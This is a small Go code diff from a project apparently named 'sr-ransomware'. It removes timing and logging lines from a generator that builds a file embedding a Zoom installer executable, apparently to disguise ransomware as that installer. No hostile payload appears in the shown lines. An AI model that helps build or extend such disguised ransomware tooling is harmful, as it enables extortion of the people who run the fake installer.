@@ -5,7 +5,6 @@ import (
     "io"
     "fmt"
     "log"
-    "time"
     "net/http"
     "io/ioutil"
     "path/filepath"
@@ -15,10 +14,7 @@ const workdir = "tmp"
 var zoomPath = filepath.Join(workdir, "ZoomInstaller.exe")
 
 func main() {
-    t := time.Now()
     log.Println("> Generating github.com/sug0/sr-ransomware/go/exe/zoom_buffer.go")
-    defer log.Printf("< Completed in %s\n", time.Since(t))
-
     if _, err := os.Stat("zoom_buffer.go"); err == nil {
         return
     }
